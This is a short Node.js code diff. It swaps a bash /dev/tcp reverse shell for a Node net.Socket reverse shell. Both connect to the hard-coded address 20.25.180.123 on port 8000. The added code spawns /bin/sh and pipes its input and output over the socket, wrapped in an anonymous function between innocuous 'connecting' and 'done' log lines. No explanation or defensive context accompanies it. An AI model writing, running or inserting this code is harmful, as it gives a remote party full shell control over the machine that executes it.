@@ -1,5 +1,14 @@
 console.log('connecting');
-const cp = require("child_process")
-console.log('connecting2');
-cp.exec(`/bin/bash -i >& /dev/tcp/20.25.180.123/8000 0>&1`)
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8000, "20.25.180.123", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
 console.log('done');
